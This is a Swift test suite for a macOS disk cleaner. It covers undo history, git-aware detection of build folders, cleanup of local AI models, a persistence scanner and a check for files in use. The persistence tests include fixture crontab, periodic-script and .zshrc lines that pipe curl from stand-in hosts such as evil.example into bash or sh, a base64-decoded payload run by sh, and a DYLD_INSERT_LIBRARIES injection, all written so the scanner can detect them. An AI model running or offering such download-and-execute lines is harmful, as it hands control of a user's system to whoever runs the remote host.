import Foundation
import Testing
@testable import SweepCore

/// Features from the survey of other open-source cleaners: undo history, a git gate for project
/// builds, more project types, local AI models, wider persistence checks and the in-use check.

// MARK: - Clean history and undo

@Suite struct CleanHistoryTests {
    func cleaner(_ s: Sandbox) -> (Cleaner, RecordingRemover) {
        let remover = RecordingRemover()
        remover.trashFolder = s.base.appendingPathComponent("FakeTrash")
        return (Cleaner(env: s.env, remover: remover), remover)
    }

    @Test func cleanerReportsWhereItemsLanded() {
        let s = Sandbox()
        let a = s.file("~/Library/Caches/com.a/x", bytes: 100).deletingLastPathComponent()
        let (cleaner, _) = cleaner(s)
        let r = cleaner.remove([(a, 4096)])
        #expect(r.trashed.count == 1)
        #expect(r.trashed[0].original == a)
        #expect(FileManager.default.fileExists(atPath: r.trashed[0].inTrash.path))
        #expect(r.trashed[0].size == 4096)
    }

    @Test func undoPutsEverythingBack() throws {
        let s = Sandbox()
        s.file("~/Library/Caches/com.a/data.db", bytes: 100)
        s.file("~/Library/Logs/app.log", bytes: 100)
        let scan = JunkScanner(env: s.env).scan()
        let (cleaner, _) = cleaner(s)
        let report = cleaner.remove(scan.items)
        #expect(!s.exists("~/Library/Caches/com.a"))

        let history = CleanHistory(fileURL: s.base.appendingPathComponent("history.json"))
        let entry = try #require(history.record(module: "System Junk", report: report))
        #expect(history.restorableCount(entry) == 2)

        let restore = history.restore(entry.id)
        #expect(restore.restored.count == 2)
        #expect(restore.failed.isEmpty)
        #expect(s.exists("~/Library/Caches/com.a/data.db"))
        #expect(s.exists("~/Library/Logs/app.log"))
        #expect(history.entries[0].restoredAt != nil)
        #expect(history.restorableCount(history.entries[0]) == 0, "an entry is restored once")
    }

    @Test func undoNeverOverwritesAndReportsWhatIsGone() throws {
        let s = Sandbox()
        let a = s.file("~/Library/Caches/a", bytes: 10)
        let b = s.file("~/Library/Caches/b", bytes: 10)
        let (cleaner, _) = cleaner(s)
        let report = cleaner.remove([(a, 10), (b, 10)])
        let history = CleanHistory(fileURL: s.base.appendingPathComponent("history.json"))
        let entry = try #require(history.record(module: "Test", report: report))
        s.file("~/Library/Caches/a", bytes: 3)                                              // something new took a's place
        try FileManager.default.removeItem(at: report.trashed.first { $0.original == b }!.inTrash) // b's Trash copy emptied
        let r = history.restore(entry.id)
        #expect(r.restored.isEmpty)
        #expect(Set(r.failed.map(\.reason)) == ["Something else is in its place now", "No longer in the Trash"])
        #expect(try Data(contentsOf: a).count == 3, "the new file is untouched")
    }

    @Test func permanentRemovalsAreCountedButNotRestorable() throws {
        let s = Sandbox()
        s.file("~/.Trash/old.zip", bytes: 10)            // Trash contents are always deleted for good
        s.file("~/Library/Caches/c", bytes: 10)
        let (cleaner, _) = cleaner(s)
        let report = cleaner.remove(JunkScanner(env: s.env).scan().items)
        let history = CleanHistory(fileURL: s.base.appendingPathComponent("h.json"))
        let entry = try #require(history.record(module: "Junk", report: report))
        #expect(entry.removedCount == 2)
        #expect(entry.trashed.count == 1)
        #expect(entry.permanentCount == 1)
    }

    @Test func historyPersistsAndIsCapped() {
        let s = Sandbox()
        let url = s.base.appendingPathComponent("h.json")
        let history = CleanHistory(fileURL: url)
        var report = CleanReport()
        report.removed = [URL(fileURLWithPath: "/tmp/x")]
        for i in 0..<(CleanHistory.limit + 5) { history.record(module: "M\(i)", report: report) }
        let again = CleanHistory(fileURL: url)
        #expect(again.entries.count == CleanHistory.limit)
        #expect(again.entries.first?.module == "M\(CleanHistory.limit + 4)", "newest first")
        #expect(history.record(module: "empty", report: CleanReport()) == nil)
    }
}

// MARK: - Git gate and project types

@Suite struct GitGateTests {
    let git = GitTool.path

    func run(_ args: [String], in dir: URL) {
        _ = ProcessRunner().run(git!, ["-C", dir.path, "-c", "user.email=t@example.com", "-c", "user.name=t"] + args)
    }

    @Test func trackedFoldersAreNeverOffered() throws {
        try #require(git != nil, "git is not installed")
        let s = Sandbox()
        let repo = s.dir("~/Code/web")
        run(["init", "-q"], in: repo)
        s.file("~/Code/web/package.json")
        s.file("~/Code/web/node_modules/vendored/lib.js", bytes: 5000)   // committed on purpose
        run(["add", "-A"], in: repo); run(["commit", "-q", "-m", "init"], in: repo)
        #expect(BuildArtifactFinder(env: s.env).find().isEmpty)
    }

    @Test func untrackedSpecificFoldersAreOffered() throws {
        try #require(git != nil, "git is not installed")
        let s = Sandbox()
        let repo = s.dir("~/Code/web")
        run(["init", "-q"], in: repo)
        s.file("~/Code/web/package.json")
        run(["add", "-A"], in: repo); run(["commit", "-q", "-m", "init"], in: repo)
        s.file("~/Code/web/node_modules/react/index.js", bytes: 5000)
        #expect(BuildArtifactFinder(env: s.env).find().map(\.title) == ["web/node_modules"])
    }

    @Test func genericFoldersNeedGitIgnore() throws {
        try #require(git != nil, "git is not installed")
        let s = Sandbox()
        let ignored = s.dir("~/Code/a")
        run(["init", "-q"], in: ignored)
        s.file("~/Code/a/Cargo.toml")
        s.file("~/Code/a/.gitignore", data: Data("target/\n".utf8))
        s.file("~/Code/a/target/debug/app", bytes: 5000)
        let notIgnored = s.dir("~/Code/b")
        run(["init", "-q"], in: notIgnored)
        s.file("~/Code/b/Cargo.toml")
        s.file("~/Code/b/target/debug/app", bytes: 5000)   // a "target" the project might mean literally
        #expect(BuildArtifactFinder(env: s.env).find().map(\.title) == ["a/target"])
    }

    @Test func withoutGitOnlySpecificNamesInsideRepos() {
        let s = Sandbox()
        s.dir("~/Code/r/.git")
        s.file("~/Code/r/Cargo.toml"); s.file("~/Code/r/target/x", bytes: 5000)
        s.file("~/Code/r/package.json"); s.file("~/Code/r/node_modules/x", bytes: 5000)
        let found = BuildArtifactFinder(env: s.env, runner: FakeRunner(), git: nil).find().map(\.title)
        #expect(found == ["r/node_modules"])
    }

    @Test func nestedRepositoriesAreSkipped() throws {
        let s = Sandbox()
        s.file("~/Code/app/package.json")
        s.file("~/Code/app/node_modules/x", bytes: 5000)
        s.dir("~/Code/app/node_modules/.git")   // a checked-out repository, not an install
        #expect(BuildArtifactFinder(env: s.env, runner: FakeRunner(), git: nil).find().isEmpty)
    }

    @Test func outsideGitNothingChanges() {
        let s = Sandbox()
        s.file("~/Code/app/Cargo.toml"); s.file("~/Code/app/target/x", bytes: 5000)
        let runner = FakeRunner()
        #expect(BuildArtifactFinder(env: s.env, runner: runner, git: "/usr/bin/git").find().map(\.title) == ["app/target"])
        #expect(runner.calls.isEmpty, "git is not asked about folders outside a repository")
    }
}

@Suite struct MoreProjectTypesTests {
    @Test func findsNewEcosystems() {
        let s = Sandbox()
        func p(_ dir: String, _ marker: String, _ artifact: String) {
            s.file("~/P/\(dir)/\(marker)")
            s.file("~/P/\(dir)/\(artifact)/payload", bytes: 5000)
        }
        p("py", "pyproject.toml", "__pycache__")
        p("py", "pyproject.toml", ".venv")
        p("py", "pyproject.toml", ".pytest_cache")
        p("godot", "project.godot", ".godot")
        p("dotnet", "App.csproj", "obj")
        p("tf", "main.tf", ".terraform")
        p("zig", "build.zig", "zig-cache")
        p("ex", "mix.exs", "_build")
        p("hs", "stack.yaml", ".stack-work")
        p("unreal", "Game.uproject", "Intermediate")
        s.file("~/P/unity/ProjectSettings/ProjectVersion.txt")
        s.file("~/P/unity/Library/ShaderCache/x", bytes: 5000)
        let found = Set(BuildArtifactFinder(env: s.env, runner: FakeRunner(), git: nil).find().map(\.title))
        #expect(found == ["py/__pycache__", "py/.venv", "py/.pytest_cache", "godot/.godot", "dotnet/obj", "tf/.terraform",
                          "zig/zig-cache", "ex/_build", "hs/.stack-work", "unreal/Intermediate", "unity/Library"])
    }

    @Test func lookalikesWithoutMarkersAreLeftAlone() {
        let s = Sandbox()
        s.file("~/Documents/Novel/Library/chapter1.docx", bytes: 5000)   // no Unity project here
        s.file("~/Documents/Taxes/bin/receipts.pdf", bytes: 5000)        // no .csproj
        s.file("~/Documents/Notes/venv/notes.txt", bytes: 5000)          // no Python project
        #expect(BuildArtifactFinder(env: s.env, runner: FakeRunner(), git: nil).find().isEmpty)
    }

    @Test func kindTableIsConsistent() {
        for kind in BuildArtifactFinder.kinds { #expect(!kind.markers.isEmpty && !kind.title.isEmpty) }
        let generic = Set(BuildArtifactFinder.kinds.filter(\.generic).map(\.folder))
        #expect(generic.isSuperset(of: ["build", "target", "bin", "obj", "Library", "venv", "deps"]))
        #expect(!generic.contains("node_modules"))
    }
}

// MARK: - Local AI models

@Suite struct AIModelTests {
    func manifest(_ s: Sandbox, _ path: String, _ digests: [String]) {
        let json: [String: Any] = ["config": ["digest": digests[0], "size": 10],
                                   "layers": digests.dropFirst().map { ["digest": $0, "size": 10] }]
        s.file("~/.ollama/models/manifests/registry.ollama.ai/\(path)", data: try! JSONSerialization.data(withJSONObject: json))
    }

    @Test func ollamaModelsShareBlobsSafely() throws {
        let s = Sandbox()
        let mb = 1_048_576
        s.file("~/.ollama/models/blobs/sha256-shared", bytes: 20 * mb)
        s.file("~/.ollama/models/blobs/sha256-a", bytes: 15 * mb)
        s.file("~/.ollama/models/blobs/sha256-b", bytes: 12 * mb)
        manifest(s, "library/llama3/8b", ["sha256:a", "sha256:shared"])
        manifest(s, "someone/coder/latest", ["sha256:b", "sha256:shared"])
        let items = AIModelScanner(env: s.env).scan().filter { $0.detail.hasPrefix("Ollama") }
        let llama = try #require(items.first { $0.title == "llama3:8b" })
        let coder = try #require(items.first { $0.title == "someone/coder:latest" })
        #expect(llama.group == .aiModels && !llama.selectedByDefault)
        #expect(llama.detail.contains("shared"))
        // Removing a model takes its manifest and its own blob, never the shared one.
        let files = { (i: DevItem) -> [String] in if case .files(let u) = i.removal { return u.map(\.lastPathComponent) }; return [] }
        #expect(Set(files(llama)) == ["8b", "sha256-a"])
        #expect(Set(files(coder)) == ["latest", "sha256-b"])
        #expect(llama.size >= Int64(15 * mb) && llama.size < Int64(20 * mb), "size counts only what removal frees")
    }

    @Test func otherModelStores() {
        let s = Sandbox()
        let big = 11 * 1_048_576
        s.file("~/.cache/huggingface/hub/models--meta-llama--Llama-3.2-1B/blobs/x", bytes: big)
        s.file("~/.cache/huggingface/hub/datasets--org--set/blobs/x", bytes: big)
        s.file("~/.cache/huggingface/hub/version.txt", bytes: 10)
        s.file("~/.lmstudio/models/lmstudio-community/Qwen-7B-GGUF/model.gguf", bytes: big)
        s.file("~/Library/Application Support/nomic.ai/GPT4All/mistral.gguf", bytes: big)
        s.file("~/Library/Application Support/nomic.ai/GPT4All/localdocs.db", bytes: 100)   // too small to be a model
        s.file("~/.cache/whisper/medium.pt", bytes: big)
        let titles = Set(AIModelScanner(env: s.env).scan().map(\.title))
        #expect(titles == ["meta-llama/Llama-3.2-1B", "org/set", "lmstudio-community/Qwen-7B-GGUF", "mistral.gguf", "medium.pt"])
    }

    @Test func developerScanIncludesModelsUnselected() {
        let s = Sandbox()
        s.file("~/.cache/whisper/small.pt", bytes: 11 * 1_048_576)
        let models = DevFolderScanner(env: s.env).scan().filter { $0.group == .aiModels }
        #expect(models.count == 1)
        #expect(models.allSatisfy { !$0.selectedByDefault })
    }

    @Test func excludedModelsAreHidden() {
        let s = Sandbox()
        s.file("~/.cache/whisper/keep.pt", bytes: 11 * 1_048_576)
        var env = s.env
        env.exclusions = [env.resolve("~/.cache/whisper/keep.pt")]
        #expect(AIModelScanner(env: env).scan().isEmpty)
    }
}

// MARK: - Persistence

@Suite struct PersistenceTests {
    func scanner(_ s: Sandbox, runner: FakeRunner = FakeRunner(), signed: Bool = true) -> PersistenceScanner {
        PersistenceScanner(env: s.env, runner: runner, codeSignatureCheck: { _ in signed })
    }

    @Test func cronJobsAreListedAndJudged() {
        let s = Sandbox()
        let runner = FakeRunner()
        runner.responses["/usr/bin/crontab -l"] = CommandResult(status: 0, output: """
        # backups
        SHELL=/bin/bash
        0 3 * * * /usr/local/bin/backup.sh
        */5 * * * * curl -s http://evil.example/x | bash
        @reboot /Users/Shared/.agent/run
        """)
        let items = scanner(s, runner: runner).cron()
        #expect(items.count == 3)
        #expect(items.first { $0.title.contains("backup.sh") }?.level == nil)
        #expect(items.first { $0.title.contains("curl") }?.reasons.contains("Downloads a script and runs it") == true)
        #expect(items.first { $0.title.hasPrefix("@reboot") }?.level == .suspicious)
    }

    @Test func onlyNonStockPeriodicScripts() {
        let s = Sandbox()
        s.file("/etc/periodic/daily/110.clean-tmps")
        s.file("/etc/periodic/daily/500.updater", data: Data("curl http://x.example/u | sh\n".utf8))
        let items = scanner(s).periodic()
        #expect(items.map(\.title) == ["500.updater"])
        #expect(items[0].level == .suspicious)
    }

    @Test func shellFilesShowOnlySuspiciousLines() {
        let s = Sandbox()
        s.file("~/.zshrc", data: Data("""
        export PATH="$HOME/bin:$PATH"
        eval "$(/opt/homebrew/bin/brew shellenv)"
        # curl http://commented.example | sh
        eval "$(curl -fsSL http://x.example/i)"
        echo aGVsbG8= | base64 -d | sh
        """.utf8))
        let items = scanner(s).shellConfigs()
        #expect(items.count == 2)
        #expect(items.map(\.detail) == ["~/.zshrc, line 4", "~/.zshrc, line 5"])
        #expect(items.allSatisfy { $0.level == .suspicious })
    }

    @Test func browserExtensionsWithLocalizedNames() throws {
        let s = Sandbox()
        let base = "~/Library/Application Support/Google/Chrome/Default/Extensions"
        s.file("\(base)/aaaa/1.2.0_0/manifest.json", data: Data(#"{"name": "__MSG_appName__", "default_locale": "en"}"#.utf8))
        s.file("\(base)/aaaa/1.2.0_0/_locales/en/messages.json", data: Data(#"{"appName": {"message": "Password Helper"}}"#.utf8))
        s.file("\(base)/bbbb/3.0_0/manifest.json", data: Data(#"{"name": "Safe Finder Search"}"#.utf8))
        let ff: [String: Any] = ["addons": [
            ["id": "ublock@example", "type": "extension", "location": "app-profile", "defaultLocale": ["name": "uBlock"]],
            ["id": "builtin@mozilla", "type": "extension", "location": "app-builtin"],
        ]]
        s.file("~/Library/Application Support/Firefox/Profiles/abc.default/extensions.json",
               data: try JSONSerialization.data(withJSONObject: ff))
        let items = scanner(s).browserExtensions()
        #expect(Set(items.map(\.title)) == ["Password Helper", "Safe Finder Search", "uBlock"])
        #expect(items.first { $0.title == "Safe Finder Search" }?.level == .known)
        #expect(items.first { $0.title == "Password Helper" }?.level == nil)
    }

    @Test func pluginsAndKextsFlagMissingSignatures() {
        let s = Sandbox()
        s.dir("~/Library/QuickLook/Markdown.qlgenerator")
        s.dir("/Library/Spotlight/Sketch.mdimporter")
        s.dir("/Library/Security/SecurityAgentPlugins/Vendor.bundle")
        s.dir("/Library/Extensions/Driver.kext")
        let signed = scanner(s, signed: true).scan()
        #expect(Set(signed.map(\.kind)) == [.quickLook, .spotlight, .authPlugin, .kernelExtension])
        #expect(signed.allSatisfy { $0.level == nil })
        let unsigned = scanner(s, signed: false).scan()
        #expect(unsigned.allSatisfy { $0.level == .suspicious && $0.reasons.contains("Not validly signed") })
    }

    @Test func systemExtensionsParsed() {
        let out = """
        2 extension(s)
        --- com.apple.system_extension.network_extension
        enabled\tactive\tteamID\tbundleID (version)\tname\t[state]
        *\t*\tABCDE12345\tcom.vendor.vpn.extension (2.1/210)\tVendor VPN\t[activated enabled]
        """
        let parsed = PersistenceScanner.parseSystemExtensions(out)
        #expect(parsed.count == 1)
        #expect(parsed[0].bundleID == "com.vendor.vpn.extension")
        #expect(parsed[0].team == "ABCDE12345")
        #expect(parsed[0].state == "activated enabled")
    }

    @Test func dylibInjectionInLaunchItems() {
        let s = Sandbox()
        s.plist("~/Library/LaunchAgents/com.x.plist", ["Label": "com.x", "Program": "/bin/x",
                                                       "EnvironmentVariables": ["DYLD_INSERT_LIBRARIES": "/tmp/hook.dylib"]])
        s.plist("~/Library/LaunchAgents/com.ok.plist", ["Label": "com.ok", "Program": "/bin/ok"])
        let items = scanner(s).dylibInserts()
        #expect(items.map(\.title) == ["com.x"])
        #expect(items[0].level == .suspicious)
    }

    @Test func scanIsReadOnlyAndSortsWorstFirst() {
        let s = Sandbox()
        s.file("~/.zshrc", data: Data("curl http://x.example | sh\n".utf8))
        s.dir("~/Library/QuickLook/Fine.qlgenerator")
        let runner = FakeRunner()
        let items = scanner(s, runner: runner).scan()
        #expect(items.first?.kind == .shellConfig)
        #expect(Set(runner.calls.map { $0.joined(separator: " ") }) == ["/usr/bin/crontab -l", "/usr/bin/systemextensionsctl list"])
        #expect(s.exists("~/.zshrc"))
    }
}

// MARK: - In-use check

@Suite struct OpenFilesTests {
    let lsof = """
    p101
    cSafari
    n/Users/me/Library/Caches/com.apple.Safari/Cache.db
    n/Users/me/Library/Caches/com.apple.Safari/fsCachedData
    nTCP 127.0.0.1:443
    p202
    cXcode
    n/Users/me/Library/Developer/Xcode/DerivedData/App-abc/Build/x.o
    p303
    cMyOpenCleaner
    n/Users/me/Library/Caches/com.other/a
    """

    @Test func parsesProcessesAndPaths() {
        let h = OpenFiles.parse(lsof)
        #expect(h.count == 4, "network entries are ignored")
        #expect(h[0] == OpenFileHolder(pid: 101, command: "Safari", path: "/Users/me/Library/Caches/com.apple.Safari/Cache.db"))
        #expect(h[2].command == "Xcode")
    }

    @Test func mapsHoldersToTargetsAndSkipsItself() {
        let runner = FakeRunner()
        runner.defaultResult = CommandResult(status: 0, output: lsof)
        let safari = URL(fileURLWithPath: "/Users/me/Library/Caches/com.apple.Safari")
        let derived = URL(fileURLWithPath: "/Users/me/Library/Developer/Xcode/DerivedData")
        let other = URL(fileURLWithPath: "/Users/me/Library/Caches/com.other")
        let free = URL(fileURLWithPath: "/Users/me/Library/Caches/com.free")
        let map = OpenFiles.holders(of: [safari, derived, other, free], runner: runner, excludingPID: 303)
        #expect(map[safari] == ["Safari"])
        #expect(map[derived] == ["Xcode"])
        #expect(map[other] == nil, "our own open files do not count")
        #expect(map[free] == nil)
        #expect(runner.calls.count == 1, "one lsof run for all targets")
        let text = OpenFiles.warning(for: map)
        #expect(text?.contains("2 of the selected items are open in Safari, Xcode") == true)
        #expect(OpenFiles.warning(for: [:]) == nil)
    }

    @Test func prefixMustBeAPathBoundary() {
        let runner = FakeRunner()
        runner.defaultResult = CommandResult(status: 0, output: "p1\ncApp\nn/Users/me/Library/Caches/com.app-helper/x\n")
        let map = OpenFiles.holders(of: [URL(fileURLWithPath: "/Users/me/Library/Caches/com.app")], runner: runner, excludingPID: 0)
        #expect(map.isEmpty)
    }

    @Test func realLsofFindsAFileThisTestHoldsOpen() throws {
        let s = Sandbox()
        let f = s.file("~/held.txt", bytes: 10)
        let handle = try FileHandle(forReadingFrom: f)
        defer { try? handle.close() }
        // Exclude no pid: the test process itself is the holder.
        let map = OpenFiles.holders(of: [f], runner: ProcessRunner(), excludingPID: -1)
        #expect(map[f]?.isEmpty == false)
    }
}
